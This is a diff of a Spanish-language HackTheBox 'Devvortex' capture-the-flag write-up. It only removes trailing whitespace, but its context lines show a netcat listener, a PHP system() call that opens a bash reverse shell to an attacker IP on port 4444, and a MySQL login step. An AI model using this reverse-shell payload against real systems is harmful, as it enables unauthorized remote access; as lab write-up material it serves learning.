@@ -2,7 +2,7 @@
 
 IP=10.10.11.242
 
-```bash	
+```bash
 echo "$IP devvortex.htb" | sudo tee -a /etc/hosts
 ```
 
@@ -112,7 +112,7 @@ nc -lvnp 4444
 system('bash -c "bash -i >& /dev/tcp/10.10.14.216/4444 0>&1"');
 
 ### Una vez dentro, nos conectamos a la base de datos
-    
+
 ```bash
 mysql -u lewis -p
 ```
